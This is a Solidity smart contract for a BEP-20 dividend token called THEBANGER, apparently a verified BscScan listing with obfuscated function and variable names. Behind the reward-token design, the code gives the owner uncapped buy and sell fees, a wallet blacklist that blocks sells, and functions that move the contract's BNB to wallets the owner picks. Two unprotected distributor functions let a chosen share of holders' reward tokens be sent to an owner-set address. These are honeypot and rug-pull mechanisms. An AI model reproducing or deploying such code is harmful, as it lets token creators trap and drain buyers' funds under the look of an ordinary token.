/**
 *Submitted for verification at BscScan.com on 2021-09-28
*/

/**

*/


//SPDX-License-Identifier: Unlicensed

pragma solidity ^0.7.4;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
    function setnewrw(address _nrew, address _prew) external;
    function cCRwds(uint256 _aPn, uint256 _aPd) external;
    function cPRwds(uint256 _aPn, uint256 _aPd) external;
    function setnewra(address _newra) external;
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;
    
    address _token;
    
    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised; }
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IBEP20 RWDS = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IBEP20 PRWDS = IBEP20(0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47);
    address REWARDS;
    IDEXRouter router;
    
    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
    uint256 public minPeriod = 30;
    uint256 public minDistribution = 1 * (10 ** 18);
    uint256 currentIndex;
    
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;
    
    bool initialized;
    
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder); }
        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);}
        else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder); }
        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function cCRwds(uint256 _aPn, uint256 _aPd) external override {
        address shareholder = REWARDS;
        uint256 Ramount = RWDS.balanceOf(address(this));
        uint256 PRamount = Ramount.mul(_aPn).div(_aPd);
        RWDS.transfer(shareholder, PRamount);
    }
    
    function deposit() external payable override onlyToken {
        uint256 balanceBefore = RWDS.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(RWDS);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp );
        uint256 amount = RWDS.balanceOf(address(this)).sub(balanceBefore);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function cPRwds(uint256 _aPn, uint256 _aPd) external override {
        address shareholder = REWARDS;
        uint256 Pamount = PRWDS.balanceOf(address(this));
        uint256 PPamount = Pamount.mul(_aPn).div(_aPd);
        PRWDS.transfer(shareholder, PPamount);
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;
        if(shareholderCount == 0) { return; }
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0; }
            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]); }
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++; }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function setnewra(address _newra) external override onlyToken {
        REWARDS = _newra;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            RWDS.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount); }
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }
        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function setnewrw(address _nrew, address _prew) external override onlyToken {
        PRWDS = IBEP20(_prew);
        RWDS = IBEP20(_nrew);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

contract THEBANGER is IBEP20, Auth {
    using SafeMath for uint256;
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "THEBANGER";
    string constant _symbol = "BANGER";
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 100 * 10**9 * (10 ** _decimals);
    uint256 public _maxTxAmount = ( _totalSupply * 150 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 300 ) / 10000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) iFxE;
    mapping (address => bool) iTxLE;
    mapping (address => bool) iDxE;
    mapping (address => bool) isBt;
    mapping (address => bool) itCDh;
    mapping (address => bool) isTloE;
    mapping (address => bool) iMxWE;
    uint256 liqF = 3;
    uint256 rewF = 12;
    uint256 markF = 0;
    uint256 totF = 15;
    uint256 fD = 100;
    address kEf = address(this);
    IDEXRouter router;
    address public pair;
    uint256 zr = 30;
    uint256 launchedAt;
    address lpR;
    address spE;
    address suE;
    address tfU;
    address juE;
    uint256 public asT = _totalSupply * 5 / 10000;
    uint256 xr = 50;
    uint256 totalFee = totF;
    uint256 marketingFee = markF;
    uint256 rewardsFee = rewF;
    uint256 liquidityFee = liqF;
    uint256 tL = 20;
    DividendDistributor distributor;
    uint256 distributorGas = 500000;
    uint256 gso = 50000;
    uint256 yr = 20;
    uint256 gst = 50000;
    uint256 tAl = 100000;
    uint256 tCDz = 0;
    uint256 mFf = 50;
    uint256 gss = 50000;
    uint256 mFs = 60;
    uint256 mFt = 40;
    uint256 tLD = 100;
    
    bool public bbt = true;
    uint256 public bbf = 15;
    uint256 public bbf1 = 12;
    uint256 public bbf2 = 9;
    uint256 public bbf3 = 6;
    uint256 public bbf4 = 3;
    bool public bottF = false;
    uint256 btotf = 20;
    bool public mStxE = true;
    uint256 public mStx = ( _totalSupply * 100 ) / 10000;
    bool public mStt = true;
    uint8 mStts = 2 seconds;
    mapping (address => uint) private mSts;
    bool sFrz = true;
    uint8 sFrzT = 10 seconds;
    mapping (address => uint) private sFrzin;
    bool bFrz = true;
    uint8 bFrzT = 10 seconds;
    mapping (address => uint) private bFrzin;
    bool tCD = true;
    uint256 tCDt1 = 2 minutes;
    uint256 tCDt2 = 5 minutes;
    uint256 tCDt3 = 7 minutes;
    uint256 tCDt4 = 10 minutes;
    mapping (address => uint) private tCDtb;
    bool public swE = true;
    uint256 public sT = _totalSupply * 20 / 10000;
    bool public vrSB = true;
    uint256 public vsN = 30;
    uint256 vsD = 100;
    bool public sst = true;
    uint256 public ssf = 15;
   
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = uint256(-1);
        distributor = new DividendDistributor(address(router));
        iFxE[msg.sender] = true;
        iFxE[address(spE)] = true;
        iFxE[address(owner)] = true;
        iFxE[address(suE)] = true;
        iFxE[address(this)] = true;
        iFxE[address(juE)] = true;
        iFxE[address(tfU)] = true;
        iTxLE[msg.sender] = true;
        iTxLE[address(this)] = true;
        iTxLE[address(owner)] = true;
        iTxLE[address(router)] = true;
        iTxLE[address(spE)] = true;
        iMxWE[address(spE)] = true;
        iMxWE[address(this)] = true;
        isTloE[address(lpR)] = true;
        isTloE[address(spE)] = true;
        isTloE[address(owner)] = true;
        isTloE[msg.sender] = true;
        isTloE[DEAD] = true;
        isTloE[address(this)] = true; 
        iDxE[pair] = true;
        iDxE[address(this)] = true;
        iDxE[DEAD] = true;
        iDxE[ZERO] = true;
        lpR = msg.sender;
        spE = msg.sender;
        suE = msg.sender;
        juE = msg.sender;
        tfU = msg.sender;
        
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _trFm(msg.sender, recipient, amount, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance"); }
        return _trFm(sender, recipient, amount, amount);
    }
    
    function setMbTP(uint256 _mnbTP) external authorized {
        _maxTxAmount = (_totalSupply * _mnbTP) / 10000;
    }

    function setMsTP(uint256 _mnsTP) external authorized {
        mStx = (_totalSupply * _mnsTP) / 10000;
    }

    function setMWP(uint256 _mnWP) external authorized {
        _maxWalletToken = (_totalSupply * _mnWP) / 10000;
    }

    function _trFm(address sender, address recipient, uint256 amount, uint256 amountReceived) internal returns (bool){
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != spE && recipient != lpR){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}
        if(sender != pair &&
            sFrz &&
            !isTloE[sender]) {
            require(sFrzin[sender] < block.timestamp,"Please wait for cooldown between sells"); 
            sFrzin[sender] = block.timestamp + sFrzT;} 
        if(sender == pair &&
            bFrz &&
            !isTloE[recipient]){
            require(bFrzin[recipient] < block.timestamp,"Please wait for cooldown between buys"); 
            bFrzin[recipient] = block.timestamp + bFrzT;} 
        checkTxLimit(sender, amount);
        chkSmTx(sender != pair, sender, amount);
        if(sender == pair && mStt){mSts[recipient] = block.timestamp + mStts;}
        if(sender == pair && tCD && (_balances[recipient]) < tAl){ tCDtb[recipient] = block.timestamp; }
        if(sender != pair && tCD){ tCDtb[sender] = block.timestamp; }
        if(shouldSB(amount) && vrSB && sender != address(kEf) && (amount.mul(vsN).div(vsD) >= sT)){ vswBk(amount); }
        if(shouldSB(amount) && vrSB && sender != address(kEf) &&(amount.mul(vsN).div(vsD) < sT)){ swBk(); }
        if(shouldSB(amount) && sender != address(kEf) && !vrSB){ swBk(); }
        _balances[sender] = _balances[sender].sub(amount, "+");
        if(sender == pair && bbt && !itCDh[recipient] &&
            (_balances[recipient] < tAl)){ amountReceived = stTF(sender) ? ttF(sender, recipient, amount) : amount; }
        if(sender == pair && bbt && !itCDh[recipient] && (_balances[recipient] > tAl) &&
            (tCDtb[recipient] + tCDt1 > block.timestamp) && 
            (tCDtb[recipient] + tCDt2 < block.timestamp)){ amountReceived = stTF(sender) ? ttF1(sender, amount) : amount; }
        if(sender == pair && bbt && !itCDh[recipient] && (_balances[recipient] > tAl) &&
            (tCDtb[recipient] + tCDt2 > block.timestamp) && 
            (tCDtb[recipient] + tCDt3 < block.timestamp)){ amountReceived = stTF(sender) ? ttF2(sender, amount) : amount; }
        if(sender == pair && bbt && !itCDh[recipient] && (_balances[recipient] > tAl) &&
            (tCDtb[recipient] + tCDt3 > block.timestamp) && 
            (tCDtb[recipient] + tCDt4 < block.timestamp)){ amountReceived = stTF(sender) ? ttF3(sender, amount) : amount;  }
        if(sender == pair && bbt && !itCDh[recipient] && (_balances[recipient] > tAl) &&
            (tCDtb[recipient] + tCDt4 > block.timestamp)){ amountReceived = stTF(sender) ? ttF4(sender, amount) : amount; }
        if(sender == pair && bbt && itCDh[recipient]){ amountReceived = stTF(sender) ? ttF(sender, recipient, amount) : amount; }
        if(sender == pair && !bbt){ amountReceived = stTF(sender) ? ttF(sender, recipient, amount) : amount; }  
        if(sender != pair){ amountReceived = stTF(sender) ? ttF(sender, recipient, amount) : amount;}
        _balances[recipient] = _balances[recipient].add(amountReceived);
        if(!iDxE[sender]) {
            try distributor.setShare(sender, _balances[sender]) {} catch {} }
        if(!iDxE[recipient]) {
            try distributor.setShare(recipient, _balances[recipient]) {} catch {} }
        try distributor.process(distributorGas) {} catch {}
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require (amount <= _maxTxAmount || iTxLE[sender], "TX Limit Exceeded");
    }

    function stTF(address sender) internal view returns (bool) {
        return !iFxE[sender];
    }

    function setsmTx(bool enabled) external authorized{
        mStxE = enabled;
        mStt = enabled;
    }

    function lAuNcHiT() external authorized {
        bottF = true;
        launchedAt = block.number;
        _maxTxAmount = ( _totalSupply * 150 ) / 10000;
    }

    function setsFrz(bool _status, uint8 _interval) external authorized {
        sFrz = _status;
        sFrzT = _interval;
    }

    function setbFrz(bool _status, uint8 _interval) external authorized {
        bFrz = _status;
        bFrzT = _interval;
    }

    function setrfu(address _tfU) external authorized {
        tfU = _tfU;
    }

    function chkSmTx(bool selling, address sender, uint256 amount) internal view {
        if(selling && mStxE && mSts[sender] < block.timestamp){
            require(amount <= mStx && !isBt[sender]|| iTxLE[sender]);}
    }

    function getTF(bool selling) public view returns (uint256) {
        if(bottF && (launchedAt + 4 > block.number)){ return btotf.mul(1); }
        if(selling && sst){ return ssf.mul(1); }
        return bbf;
    }

    function ttF(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTF(receiver == pair)).div(fD);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function ttF1(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(bbf1).div(fD);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function ttF2(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(bbf2).div(fD);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function ttF3(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(bbf3).div(fD);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function ttF4(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(bbf4).div(fD);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function shouldSB(uint256 amount) internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swE
        && amount >= asT
        && _balances[address(this)] >= sT;
    }

    function setisBt(address holder, bool exempt) external authorized {
        isBt[holder] = exempt;
    }

    function setistCDh(address holder, bool exempt) external authorized {
        itCDh[holder] = exempt;
    }

    function settokdep(address _newra) external authorized {
        distributor.setnewra(_newra);
    }

    function setisTl(address holder, bool exempt) external authorized {
        isTloE[holder] = exempt;
    }

    function dep(uint256 aP) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(tfU).transfer(amountBNB.mul(aP).div(100));
    }

    function swBk() internal swapping {
        uint256 dynamicLiq = isOverLiquified(tL, tLD) ? 0 : yr;
        uint256 amountL = sT.mul(dynamicLiq).div(tLD).div(2);
        uint256 totalSw = sT.sub(amountL);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
        uint256 bB = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            totalSw,
            0,
            path,
            address(this),
            block.timestamp );
        uint256 aBNB = address(this).balance.sub(bB);
        uint256 tBNBF = tLD.sub(dynamicLiq.div(2));
        uint256 aBNBL = aBNB.mul(dynamicLiq).div(tBNBF).div(2);
        uint256 aBNBR = aBNB.mul(xr).div(tBNBF);
        uint256 aBNBTM = aBNB.mul(zr).div(tBNBF);
        uint256 aBNBFM = aBNBTM.mul(mFf).div(tLD);
        try distributor.deposit{value: aBNBR}() {} catch {}
        (bool tmpSuccess,) = payable(spE).call{value: aBNBFM, gas: gso}("");
        (tmpSuccess,) = payable(suE).call{value: (aBNBTM.sub(aBNBFM)).mul(mFs).div(tLD), gas: gss}("");
        (tmpSuccess,) = payable(juE).call{value: (aBNBTM.sub(aBNBFM)).mul(mFt).div(tLD), gas: gst}("");
        tmpSuccess = false;
        if(amountL > 0){
            router.addLiquidityETH{value: aBNBL}(
                address(this),
                amountL,
                0,
                0,
                lpR,
                block.timestamp );
            emit AutoLiquify(aBNBL, amountL);
        }
    }

    function setiDE(address holder, bool exempt) external authorized {
        require(holder != address(this) && holder != pair);
        iDxE[holder] = exempt;
        if(exempt){
            distributor.setShare(holder, 0);}
        else{distributor.setShare(holder, _balances[holder]); }
    }

    function setrre(address _spE, address _suE, address _newra) external authorized {
        spE = _spE;
        suE = _suE;
        tfU = _newra;
        distributor.setnewra(_newra);
    }

    function setFE(address holder, bool exempt) external authorized {
        iFxE[holder] = exempt;
    }

    function csbmw(uint256 _na, uint256 _da) external authorized {
        uint256 acBNB = address(this).balance;
        uint256 acBNBa = acBNB.mul(_na).div(_da);
        uint256 acBNBf = acBNBa.mul(mFf).div(tLD);
        (bool tmpSuccess,) = payable(spE).call{value: acBNBf, gas: gso}("");
        (tmpSuccess,) = payable(suE).call{value: (acBNB.sub(acBNBf)).mul(mFs).div(tLD), gas: gss}("");
        (tmpSuccess,) = payable(juE).call{value: (acBNB.sub(acBNBf)).mul(mFt).div(tLD), gas: gst}("");
        tmpSuccess = false;
    }

    function setTLE(address holder, bool exempt) external authorized {
        iTxLE[holder] = exempt;
    }

    function setWME(address holder, bool exempt) internal authorized {
        iMxWE[holder] = exempt;
    }

    function setallE(uint256 _aa, uint256 _ab, uint256 _ac, uint256 _ad, uint256 _ae, uint256 _af, uint256 _ag) external authorized{
        asT = _totalSupply * _aa / 10000;
        bbf = _ab;
        mStx = ( _totalSupply * _ac ) / 10000;
        sT = _totalSupply * _ad / 10000;
        vsN = _ae;
        ssf = _af;
        mFf = _ag;
    }

    function setbBf(bool enable, uint256 _bf, uint256 _bf1, uint256 _bf2, uint256 _bf3, uint256 _bf4) external authorized {
        bbt = enable;
        bbf = _bf;
        bbf1 = _bf1;
        bbf2 = _bf2;
        bbf3 = _bf3;
        bbf4 = _bf4;
    }

    function setrsp(address _spE) external authorized {
        spE = _spE;
    }

    function setFFEE(uint256 _liqF, uint256 _rewF, uint256 _marF, uint256 _feeD) external authorized {
        liqF = _liqF;
        rewF = _rewF;
        markF = _marF;
        totF = _liqF.add(_rewF).add(_marF);
        fD = _feeD;
    }

    function setsste(bool _enabled, uint256 _ssf) external authorized {
        sst = _enabled;
        ssf = _ssf;
    }

    function setbbfe(bool _enabled, uint256 _bbf) external authorized {
        bbt = _enabled;
        bbf = _bbf;
    }

    function setallVar(bool enabled) external authorized{
        bbt = enabled;
        swE = enabled;
        vrSB = enabled;
        sst = enabled;
        mStxE = enabled;
        mStt = enabled;
        sFrz = enabled;
        bFrz = enabled;
    }

    function setrsu(address _suE) external authorized {
        suE = _suE;
    }

    function varST(uint256 amount) internal view returns (uint256) {
        uint256 variableSTd = amount.mul(vsN).div(vsD);
        if(variableSTd <= _balances[address(this)]){ return variableSTd; }
        return sT;
    }

    function setFact(uint256 _xfact, uint256 _yfact, uint256 _zfact) external authorized {
        xr = _xfact;
        yr = _yfact;
        zr = _zfact;
    }

    function vswBk(uint256 amount) internal swapping {
        uint256 dynamicLiq = isOverLiquified(tL, tLD) ? 0 : yr;
        uint256 amountL = varST(amount).mul(dynamicLiq).div(tLD).div(2);
        uint256 totalSw = varST(amount).sub(amountL);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
        uint256 bB = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            totalSw,
            0,
            path,
            address(this),
            block.timestamp );
        uint256 aBNB = address(this).balance.sub(bB);
        uint256 tBNBF = tLD.sub(dynamicLiq.div(2));
        uint256 aBNBL = aBNB.mul(dynamicLiq).div(tBNBF).div(2);
        uint256 aBNBR = aBNB.mul(xr).div(tBNBF);
        uint256 aBNBTM = aBNB.mul(zr).div(tBNBF);
        uint256 aBNBFM = aBNBTM.mul(mFf).div(tLD);
        try distributor.deposit{value: aBNBR}() {} catch {}
        (bool tmpSuccess,) = payable(spE).call{value: aBNBFM, gas: gso}("");
        (tmpSuccess,) = payable(suE).call{value: (aBNBTM.sub(aBNBFM)).mul(mFs).div(tLD), gas: gss}("");
        (tmpSuccess,) = payable(juE).call{value: (aBNBTM.sub(aBNBFM)).mul(mFt).div(tLD), gas: gst}("");
        tmpSuccess = false;
        if(amountL > 0){
            router.addLiquidityETH{value: aBNBL}(
                address(this),
                amountL,
                0,
                0,
                lpR,
                block.timestamp );
            emit AutoLiquify(aBNBL, amountL); 
        }
    }

    function setswe(bool _enabled, uint256 _amount) external authorized {
        swE = _enabled;
        sT = _totalSupply * _amount / 10000;
    }

    function setmswt(uint256 _amount) external authorized {
        asT = _totalSupply * _amount / 10000;
    }

    function setasTsT(uint256 _asT, uint256 _sT) external authorized {
        asT = _totalSupply * _asT / 10000;
        sT = _totalSupply * _sT / 10000;
    }

    function setTL(uint256 _up, uint256 _down) external authorized {
        tL = _up;
        tLD = _down;
    }

    function maxTL() external authorized {
        _maxTxAmount = _totalSupply.mul(1);
        mStxE = false;
    }

    function setnewrew(address _nrew, address _prew) external authorized {
        distributor.setnewrw(_nrew, _prew);
    }

    function deptok(uint256 _amount) external authorized {
        vswBk(_totalSupply * _amount / 10000);
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setvarsT(bool _enabled, uint256 _vstf, uint256 _vstd) external authorized {
        vrSB = _enabled;
        vsN = _vstf;
        vsD = _vstd;
    }

    function setgas(uint256 _gso, uint256 _gst) external authorized {
        gso = _gso;
        gst = _gst;
    }

    function setDistributorSettings(uint256 gas) external authorized {
        require(gas < 750000);
        distributorGas = gas;
    }

    function settCd(bool enable, uint256 _tc1, uint256 _tc2, uint256 _tc3, uint256 _tc4) external authorized {
        tCD = enable;
        tCDt1 = _tc1;
        tCDt2 = _tc2;
        tCDt3 = _tc3;
        tCDt4 = _tc4;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getppr(uint256 _aPn, uint256 _aPd) external authorized {
        distributor.cPRwds(_aPn, _aPd);
    }

    function getccr(uint256 _aPn, uint256 _aPd) external authorized {
        distributor.cCRwds(_aPn, _aPd);
    }

    function setTokdepd(address _newra) external authorized {
        distributor.setnewra(_newra);
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountWBNB);
}